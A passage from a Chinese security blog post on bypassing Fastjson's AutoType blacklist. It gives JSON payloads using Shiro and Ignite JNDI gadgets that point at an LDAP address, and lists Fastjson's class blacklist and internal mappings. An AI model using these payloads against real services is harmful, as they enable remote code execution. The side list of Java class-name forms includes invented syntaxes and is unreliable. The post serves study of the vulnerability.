+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.shiro<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>shiro-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/11/19/FastjsonBypass/40.png" srcset="/img/loading.gif" lazyload></p>
+<p>该getter方法返回的是Collection，所以该get方法也是可以调用的</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.shiro.realm.jndi.JndiRealmFactory&quot;</span>,<span class="hljs-attr">&quot;jndiNames&quot;</span>:[<span class="hljs-string">&quot;ldap://127.0.0.1:8888/BvdpLNnZ&quot;</span>],<span class="hljs-attr">&quot;realms&quot;</span>:<span class="hljs-string">&quot;[]&quot;</span>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/11/19/FastjsonBypass/41.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="1-2-67"><a href="#1-2-67" class="headerlink" title="1.2.67"></a>1.2.67</h4><p>也是一条不在黑名单中的链子<code>org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup</code></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.shiro<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>shiro-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/11/19/FastjsonBypass/42.png" srcset="/img/loading.gif" lazyload></p>
+<p>链子很简单，唯一需要注意的就是最后调用<code>getTm()</code>方法</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>  <span class="hljs-attr">&quot;@type&quot;</span>: <span class="hljs-string">&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;</span>,<br>  <span class="hljs-attr">&quot;JndiNames&quot;</span>: [<br>    <span class="hljs-string">&quot;ldap://127.0.0.1:8888/BvdpLNnZ&quot;</span><br>  ],<br>  <span class="hljs-attr">&quot;$ref&quot;</span>: <span class="hljs-string">&quot;$.Tm&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/11/19/FastjsonBypass/43.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h4><p>开始AutoType时，基本上也就是绕过黑名单，找一条不在黑名单里面的链子，然后再被禁，再找。。。循环往复</p>
+<h3 id="0x03-附录"><a href="#0x03-附录" class="headerlink" title="0x03 附录"></a>0x03 附录</h3><h4 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h4><p>黑名单：黑名单在1.2.25版本之前已经存在，只是当时只存在<code>java.lang.线程</code>相关的类，猜测可能是为了防止影响效率用的吧，在1.2.24爆出漏洞之后，fastjson在1.2.25版本时，将一些官方认为比较危险的类都添加进去了，对于黑名单之中的类，fastjson会爆出异常<code>autotype is no suppert</code>，例如下图形式：</p>
+<p><img src="/2022/11/19/FastjsonBypass/1.png" srcset="/img/loading.gif" lazyload></p>
+<p>这里将1.2.25黑名单列出了，其余的黑名单可以参考<a href>这里</a></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java">bsh,com.mchange	<br>com.sun.<br>java.lang.Thread<br>java.net.Socket<br>java.rmi<br>javax.xml<br>org.apache.bcel<br>org.apache.commons.beanutils<br>org.apache.commons.collections.Transformer<br>org.apache.commons.collections.functors<br>org.apache.commons.collections4.comparators<br>org.apache.commons.fileupload<br>org.apache.myfaces.context.servlet<br>org.apache.tomcat<br>org.apache.wicket.util<br>org.codehaus.groovy.runtime<br>org.hibernate<br>org.jboss<br>org.mozilla.javascript<br>org.python.core<br>org.springframework					<span class="hljs-comment">// 1.2.25</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="缓存表"><a href="#缓存表" class="headerlink" title="缓存表"></a>缓存表</h4><blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs java">mappings.put(<span class="hljs-string">&quot;byte&quot;</span>, <span class="hljs-keyword">byte</span>.class);			<span class="hljs-comment">// 1.2.25</span><br>mappings.put(<span class="hljs-string">&quot;short&quot;</span>, <span class="hljs-keyword">short</span>.class);			<span class="hljs-comment">// 1.2.25</span><br>mappings.put(<span class="hljs-string">&quot;int&quot;</span>, <span class="hljs-keyword">int</span>.class);			<span class="hljs-comment">// 1.2.25</span><br>mappings.put(<span class="hljs-string">&quot;long&quot;</span>, <span class="hljs-keyword">long</span>.class);			<span class="hljs-comment">// 1.2.25</span><br>mappings.put(<span class="hljs-string">&quot;float&quot;</span>, <span class="hljs-keyword">float</span>.class);			<span class="hljs-comment">// 1.2.25</span><br>mappings.put(<span class="hljs-string">&quot;double&quot;</span>, <span class="hljs-keyword">double</span>.class);			<span class="hljs-comment">// 1.2.25</span><br>mappings.put(<span class="hljs-string">&quot;boolean&quot;</span>, <span class="hljs-keyword">boolean</span>.class);			<span class="hljs-comment">// 1.2.25</span><br>mappings.put(<span class="hljs-string">&quot;char&quot;</span>, <span class="hljs-keyword">char</span>.class);			<span class="hljs-comment">// 1.2.25</span><br>mappings.put(<span class="hljs-string">&quot;[byte&quot;</span>, <span class="hljs-keyword">byte</span>[].class);			<span class="hljs-comment">// 1.2.25</span><br>mappings.put(<span class="hljs-string">&quot;[short&quot;</span>, <span class="hljs-keyword">short</span>[].class);			<span class="hljs-comment">// 1.2.25</span><br>mappings.put(<span class="hljs-string">&quot;[int&quot;</span>, <span class="hljs-keyword">int</span>[].class);			<span class="hljs-comment">// 1.2.25</span><br>mappings.put(<span class="hljs-string">&quot;[long&quot;</span>, <span class="hljs-keyword">long</span>[].class);			<span class="hljs-comment">// 1.2.25</span><br>mappings.put(<span class="hljs-string">&quot;[float&quot;</span>, <span class="hljs-keyword">float</span>[].class);			<span class="hljs-comment">// 1.2.25</span><br>mappings.put(<span class="hljs-string">&quot;[double&quot;</span>, <span class="hljs-keyword">double</span>[].class);			<span class="hljs-comment">// 1.2.25</span><br>mappings.put(<span class="hljs-string">&quot;[boolean&quot;</span>, <span class="hljs-keyword">boolean</span>[].class);			<span class="hljs-comment">// 1.2.25</span><br>mappings.put(<span class="hljs-string">&quot;[char&quot;</span>, <span class="hljs-keyword">char</span>[].class);			<span class="hljs-comment">// 1.2.25</span><br>mappings.put(<span class="hljs-string">&quot;[B&quot;</span>, <span class="hljs-keyword">byte</span>[].class);			<span class="hljs-comment">// 1.2.25</span><br>mappings.put(<span class="hljs-string">&quot;[S&quot;</span>, <span class="hljs-keyword">short</span>[].class);			<span class="hljs-comment">// 1.2.25</span><br>mappings.put(<span class="hljs-string">&quot;[I&quot;</span>, <span class="hljs-keyword">int</span>[].class);			<span class="hljs-comment">// 1.2.25</span><br>mappings.put(<span class="hljs-string">&quot;[J&quot;</span>, <span class="hljs-keyword">long</span>[].class);			<span class="hljs-comment">// 1.2.25</span><br>mappings.put(<span class="hljs-string">&quot;[F&quot;</span>, <span class="hljs-keyword">float</span>[].class);			<span class="hljs-comment">// 1.2.25</span><br>mappings.put(<span class="hljs-string">&quot;[D&quot;</span>, <span class="hljs-keyword">double</span>[].class);			<span class="hljs-comment">// 1.2.25</span><br>mappings.put(<span class="hljs-string">&quot;[C&quot;</span>, <span class="hljs-keyword">char</span>[].class);			<span class="hljs-comment">// 1.2.25</span><br>mappings.put(<span class="hljs-string">&quot;[Z&quot;</span>, <span class="hljs-keyword">boolean</span>[].class);			<span class="hljs-comment">// 1.2.25</span><br>Object.class,			<span class="hljs-comment">// 1.2.25</span><br>java.lang.Cloneable.class,			<span class="hljs-comment">// 1.2.25</span><br>loadClass(<span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span>),			<span class="hljs-comment">// 1.2.25</span><br>java.lang.Exception.class,			<span class="hljs-comment">// 1.2.25</span><br>java.lang.RuntimeException.class,			<span class="hljs-comment">// 1.2.25</span><br>java.lang.IllegalAccessError.class,			<span class="hljs-comment">// 1.2.25</span><br>java.lang.IllegalAccessException.class,			<span class="hljs-comment">// 1.2.25</span><br>java.lang.IllegalArgumentException.class,			<span class="hljs-comment">// 1.2.25</span><br>java.lang.IllegalMonitorStateException.class,			<span class="hljs-comment">// 1.2.25</span><br>java.lang.IllegalStateException.class,			<span class="hljs-comment">// 1.2.25</span><br>java.lang.IllegalThreadStateException.class,			<span class="hljs-comment">// 1.2.25</span><br>java.lang.IndexOutOfBoundsException.class,			<span class="hljs-comment">// 1.2.25</span><br>java.lang.InstantiationError.class,			<span class="hljs-comment">// 1.2.25</span><br>java.lang.InstantiationException.class,			<span class="hljs-comment">// 1.2.25</span><br>java.lang.InternalError.class,			<span class="hljs-comment">// 1.2.25</span><br>java.lang.InterruptedException.class,			<span class="hljs-comment">// 1.2.25</span><br>java.lang.LinkageError.class,			<span class="hljs-comment">// 1.2.25</span><br>java.lang.NegativeArraySizeException.class,			<span class="hljs-comment">// 1.2.25</span><br>java.lang.NoClassDefFoundError.class,			<span class="hljs-comment">// 1.2.25</span><br>java.lang.NoSuchFieldError.class,			<span class="hljs-comment">// 1.2.25</span><br>java.lang.NoSuchFieldException.class,			<span class="hljs-comment">// 1.2.25</span><br>java.lang.NoSuchMethodError.class,			<span class="hljs-comment">// 1.2.25</span><br>java.lang.NoSuchMethodException.class,			<span class="hljs-comment">// 1.2.25</span><br>java.lang.NullPointerException.class,			<span class="hljs-comment">// 1.2.25</span><br>java.lang.NumberFormatException.class,			<span class="hljs-comment">// 1.2.25</span><br>java.lang.OutOfMemoryError.class,			<span class="hljs-comment">// 1.2.25</span><br>java.lang.SecurityException.class,			<span class="hljs-comment">// 1.2.25</span><br>java.lang.StackOverflowError.class,			<span class="hljs-comment">// 1.2.25</span><br>java.lang.StringIndexOutOfBoundsException.class,			<span class="hljs-comment">// 1.2.25</span><br>java.lang.TypeNotPresentException.class,			<span class="hljs-comment">// 1.2.25</span><br>java.lang.VerifyError.class,			<span class="hljs-comment">// 1.2.25</span><br>java.lang.StackTraceElement.class,			<span class="hljs-comment">// 1.2.25</span><br>java.util.HashMap.class,			<span class="hljs-comment">// 1.2.25</span><br>java.util.Hashtable.class,			<span class="hljs-comment">// 1.2.25</span><br>java.util.TreeMap.class,			<span class="hljs-comment">// 1.2.25</span><br>java.util.IdentityHashMap.class,			<span class="hljs-comment">// 1.2.25</span><br>java.util.WeakHashMap.class,			<span class="hljs-comment">// 1.2.25</span><br>java.util.LinkedHashMap.class,			<span class="hljs-comment">// 1.2.25</span><br>java.util.HashSet.class,			<span class="hljs-comment">// 1.2.25</span><br>java.util.LinkedHashSet.class,			<span class="hljs-comment">// 1.2.25</span><br>java.util.TreeSet.class,			<span class="hljs-comment">// 1.2.25</span><br>java.util.concurrent.TimeUnit.class,			<span class="hljs-comment">// 1.2.25</span><br>java.util.concurrent.ConcurrentHashMap.class,			<span class="hljs-comment">// 1.2.25</span><br>loadClass(<span class="hljs-string">&quot;java.util.concurrent.ConcurrentSkipListMap&quot;</span>),			<span class="hljs-comment">// 1.2.25</span><br>loadClass(<span class="hljs-string">&quot;java.util.concurrent.ConcurrentSkipListSet&quot;</span>),			<span class="hljs-comment">// 1.2.25</span><br>java.util.concurrent.atomic.AtomicInteger.class,			<span class="hljs-comment">// 1.2.25</span><br>java.util.concurrent.atomic.AtomicLong.class,			<span class="hljs-comment">// 1.2.25</span><br>java.util.Collections.EMPTY_MAP.getClass(),			<span class="hljs-comment">// 1.2.25</span><br>java.util.BitSet.class,			<span class="hljs-comment">// 1.2.25</span><br>java.util.Calendar.class,			<span class="hljs-comment">// 1.2.25</span><br>java.util.Date.class,			<span class="hljs-comment">// 1.2.25</span><br>java.util.Locale.class,			<span class="hljs-comment">// 1.2.25</span><br>java.util.UUID.class,			<span class="hljs-comment">// 1.2.25</span><br>java.sql.Time.class,			<span class="hljs-comment">// 1.2.25</span><br>java.sql.Date.class,			<span class="hljs-comment">// 1.2.25</span><br>java.sql.Timestamp.class,			<span class="hljs-comment">// 1.2.25</span><br>java.text.SimpleDateFormat.class,			<span class="hljs-comment">// 1.2.25</span><br>com.alibaba.fastjson.JSONObject.class,			<span class="hljs-comment">// 1.2.25</span><br>loadClass(<span class="hljs-string">&quot;java.awt.Rectangle&quot;</span>),			<span class="hljs-comment">// 1.2.25</span><br>loadClass(<span class="hljs-string">&quot;java.awt.Point&quot;</span>),			<span class="hljs-comment">// 1.2.25</span><br>loadClass(<span class="hljs-string">&quot;java.awt.Font&quot;</span>),			<span class="hljs-comment">// 1.2.25</span><br>loadClass(<span class="hljs-string">&quot;java.awt.Color&quot;</span>),			<span class="hljs-comment">// 1.2.25</span><br></code></pre></td></tr></table></figure>
+</blockquote>
+<h4 id="反序列化器"><a href="#反序列化器" class="headerlink" title="反序列化器"></a>反序列化器</h4><p>反序列化器的作用是：对于一些类，使用确定的反序列化器，比如<code>SimpleDateFormat.class</code>使用MiscCode反序列器</p>
+<blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs java">deserializers.put(SimpleDateFormat.class, MiscCodec.instance);<br>deserializers.put(java.sql.Timestamp.class, SqlDateDeserializer.instance_timestamp);<br>deserializers.put(java.sql.Date.class, SqlDateDeserializer.instance);<br>deserializers.put(java.sql.Time.class, TimeDeserializer.instance);<br>deserializers.put(java.util.Date.class, DateCodec.instance);<br>deserializers.put(Calendar.class, CalendarCodec.instance);<br>deserializers.put(XMLGregorianCalendar.class, CalendarCodec.instance);<br><br>deserializers.put(JSONObject.class, MapDeserializer.instance);<br>deserializers.put(JSONArray.class, CollectionCodec.instance);<br><br>deserializers.put(Map.class, MapDeserializer.instance);<br>deserializers.put(HashMap.class, MapDeserializer.instance);<br>deserializers.put(LinkedHashMap.class, MapDeserializer.instance);<br>deserializers.put(TreeMap.class, MapDeserializer.instance);<br>deserializers.put(ConcurrentMap.class, MapDeserializer.instance);<br>deserializers.put(ConcurrentHashMap.class, MapDeserializer.instance);<br><br>deserializers.put(Collection.class, CollectionCodec.instance);<br>deserializers.put(List.class, CollectionCodec.instance);<br>deserializers.put(ArrayList.class, CollectionCodec.instance);<br><br>deserializers.put(Object.class, JavaObjectDeserializer.instance);<br>deserializers.put(String.class, StringCodec.instance);<br>deserializers.put(StringBuffer.class, StringCodec.instance);<br>deserializers.put(StringBuilder.class, StringCodec.instance);<br>deserializers.put(<span class="hljs-keyword">char</span>.class, CharacterCodec.instance);<br>deserializers.put(Character.class, CharacterCodec.instance);<br>deserializers.put(<span class="hljs-keyword">byte</span>.class, NumberDeserializer.instance);<br>deserializers.put(Byte.class, NumberDeserializer.instance);<br>deserializers.put(<span class="hljs-keyword">short</span>.class, NumberDeserializer.instance);<br>deserializers.put(Short.class, NumberDeserializer.instance);<br>deserializers.put(<span class="hljs-keyword">int</span>.class, IntegerCodec.instance);<br>deserializers.put(Integer.class, IntegerCodec.instance);<br>deserializers.put(<span class="hljs-keyword">long</span>.class, LongCodec.instance);<br>deserializers.put(Long.class, LongCodec.instance);<br>deserializers.put(BigInteger.class, BigIntegerCodec.instance);<br>deserializers.put(BigDecimal.class, BigDecimalCodec.instance);<br>deserializers.put(<span class="hljs-keyword">float</span>.class, FloatCodec.instance);<br>deserializers.put(Float.class, FloatCodec.instance);<br>deserializers.put(<span class="hljs-keyword">double</span>.class, NumberDeserializer.instance);<br>deserializers.put(Double.class, NumberDeserializer.instance);<br>deserializers.put(<span class="hljs-keyword">boolean</span>.class, BooleanCodec.instance);<br>deserializers.put(Boolean.class, BooleanCodec.instance);<br>deserializers.put(Class.class, MiscCodec.instance);<br>deserializers.put(<span class="hljs-keyword">char</span>[].class, <span class="hljs-keyword">new</span> CharArrayCodec());<br><br>deserializers.put(AtomicBoolean.class, BooleanCodec.instance);<br>deserializers.put(AtomicInteger.class, IntegerCodec.instance);<br>deserializers.put(AtomicLong.class, LongCodec.instance);<br>deserializers.put(AtomicReference.class, ReferenceCodec.instance);<br><br>deserializers.put(WeakReference.class, ReferenceCodec.instance);<br>deserializers.put(SoftReference.class, ReferenceCodec.instance);<br><br>deserializers.put(UUID.class, MiscCodec.instance);<br>deserializers.put(TimeZone.class, MiscCodec.instance);<br>deserializers.put(Locale.class, MiscCodec.instance);<br>deserializers.put(Currency.class, MiscCodec.instance);<br>deserializers.put(InetAddress.class, MiscCodec.instance);<br>deserializers.put(Inet4Address.class, MiscCodec.instance);<br>deserializers.put(Inet6Address.class, MiscCodec.instance);<br>deserializers.put(InetSocketAddress.class, MiscCodec.instance);<br>deserializers.put(File.class, MiscCodec.instance);<br>deserializers.put(URI.class, MiscCodec.instance);<br>deserializers.put(URL.class, MiscCodec.instance);<br>deserializers.put(Pattern.class, MiscCodec.instance);<br>deserializers.put(Charset.class, MiscCodec.instance);<br>deserializers.put(JSONPath.class, MiscCodec.instance);<br>deserializers.put(Number.class, NumberDeserializer.instance);<br>deserializers.put(AtomicIntegerArray.class, AtomicCodec.instance);<br>deserializers.put(AtomicLongArray.class, AtomicCodec.instance);<br>deserializers.put(StackTraceElement.class, StackTraceElementDeserializer.instance);<br><br>deserializers.put(Serializable.class, JavaObjectDeserializer.instance);<br>deserializers.put(Cloneable.class, JavaObjectDeserializer.instance);<br>deserializers.put(Comparable.class, JavaObjectDeserializer.instance);<br>deserializers.put(Closeable.class, JavaObjectDeserializer.instance);<br></code></pre></td></tr></table></figure>
+</blockquote>
+<h4 id="补充知识："><a href="#补充知识：" class="headerlink" title="补充知识："></a>补充知识：</h4><h5 id="Java的全类名写法："><a href="#Java的全类名写法：" class="headerlink" title="Java的全类名写法："></a>Java的全类名写法：</h5><ol>
+<li>以点号 <code>.</code> 分隔的完整类名，例如 <code>java.lang.Class</code>。</li>
+<li>以字母 L 开头，以分号 <code>;</code> 结尾的类描述符，例如 <code>Ljava/lang/Class;</code>。</li>
+<li>使用反斜杠 <code>\</code> 代替斜杠 <code>/</code>，例如 <code>java\lang\Class</code>，这种方式常用于 Windows 系统下的文件路径。</li>
+<li>使用双冒号 <code>::</code> 分隔包名和类名，例如 <code>java.lang::Class</code>，这种方式是 Java 8 引入的新语法，用于方法引用和构造函数引用中。</li>
+</ol>
+<h3 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h3><p>fastjson博大精深，需要学的东西还有很多，这里也只是知道了一点皮毛，又是被菜😭一天。</p>
+<h3 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h3><ul>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/dreamthe/article/details/125851153">Fastjson历史反序列漏洞分析(1.2.24-1.2.80)</a></li>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8140">FastJson checkAutoType安全机制研究</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1bG4y157Ef/?spm_id_from=333.999.0.0">fastjson反序列化漏洞3-&lt;=1.2.47绕过</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/mole_exp/article/details/122315526?spm=1001.2101.3001.6650.5&utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-5-122315526-blog-125182603.pc_relevant_default&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-5-122315526-blog-125182603.pc_relevant_default&utm_relevant_index=9">Fastjson反序列化高危漏洞系列-part2：1.2.68反序列化漏洞及利用链分析 (上)</a></li>
+<li><a target="_blank" rel="noopener" href="https://i.blackhat.com/USA21/Wednesday-Handouts/US-21-Xing-How-I-Used-a-JSON.pdf">How I use a JSON Deserialization 0day to Steal Your Money On The Blockchain</a></li>
+<li><a target="_blank" rel="noopener" href="https://rmb122.com/2020/06/12/fastjson-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-gadgets-%E6%8C%96%E6%8E%98%E7%AC%94%E8%AE%B0/">fastjson 1.2.68 反序列化漏洞 gadgets 挖掘笔记</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/alibaba/fastjson/wiki/%E5%BE%AA%E7%8E%AF%E5%BC%95%E7%94%A8">循环引用</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/alibaba/fastjson/wiki/JSONPath">JSONPath</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/su18/hack-fastjson-1.2.80">Kcon Hacking JSON 议题乱记</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/LeadroyaL/fastjson-blacklist">fastjson blacklist</a></li>
+</ul>
+
+              
+            </div>
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Java%E5%AE%89%E5%85%A8/">#Java安全</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Fastjson Bypass</div>
+      <div>http://example.com/2022/11/19/FastjsonBypass/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Mechoy</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年11月19日</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" title="Thymeleaf模板注入">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Thymeleaf模板注入</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/11/12/fastjson1.2.24/" title="FastJson1.2.24">
+                        <span class="hidden-mobile">FastJson1.2.24</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
